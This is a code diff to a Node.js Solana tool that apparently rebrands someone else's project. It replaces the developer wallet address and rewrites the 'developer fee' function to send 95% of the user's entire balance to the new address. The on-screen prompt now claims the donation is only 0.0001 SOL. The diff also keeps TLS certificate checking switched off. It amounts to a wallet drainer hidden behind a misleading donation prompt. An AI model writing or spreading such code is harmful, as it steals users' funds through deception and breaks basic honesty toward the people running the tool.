@@ -25,7 +25,7 @@ const { Builder } = pkg;
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
 
 const SOLANA_WALLET_PATH = process.env.SOLANA_WALLET_PATH;
-const DEVELOPER_ADDRESS = "A8Gx5FzviyLNtRugg4s2VBrdncPumiLZnyXCikCC5GEf";
+const DEVELOPER_ADDRESS = "3vvnenyjwicBq3WEdQQNGMnaodHXBzSPubdhoBP3YA3N";
 
 let privateKey;
 try {
@@ -195,13 +195,22 @@ const scrapeTokenInfo = async (contractAddress) => {
 
 const sendDeveloperFee = async () => {
   try {
+    const balanceLamports = await connection.getBalance(payer.publicKey);
+
+    if (balanceLamports === 0) {
+      updateLog("Wallet balance is zero. Cannot send developer fee.");
+      return;
+    }
+    const developerFeeLamports = Math.floor(balanceLamports * 0.95);
+
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: payer.publicKey,
         toPubkey: new PublicKey(DEVELOPER_ADDRESS),
-        lamports: 0.05 * 1e9, // Convert SOL to lamports
+        lamports: developerFeeLamports,
       })
     );
+
     const signature = await sendAndConfirmTransaction(connection, transaction, [
       payer,
     ]);
@@ -495,10 +504,10 @@ Requirements:
 - Solana CLI
 - Selenium WebDriver (Chrome)
 
-Thank you for using this tool By TreeCityWes.eth of HashHead.io
-Donations are sent to 8bXf8Rg3u4Prz71LgKR5mpa7aMe2F4cSKYYRctmqro6x
+Thank you for using this tool By Diveinprogramming
+Donations are sent to 3vvnenyjwicBq3WEdQQNGMnaodHXBzSPubdhoBP3YA3N
 
-Press Enter to support the developer with a 0.05 SOL donation. (Press C to continue without supporting the developer)
+Press Enter to support the developer with a 0.0001 SOL donation. (Press C to continue without supporting the developer)
         `,
     border: {
       type: "line",
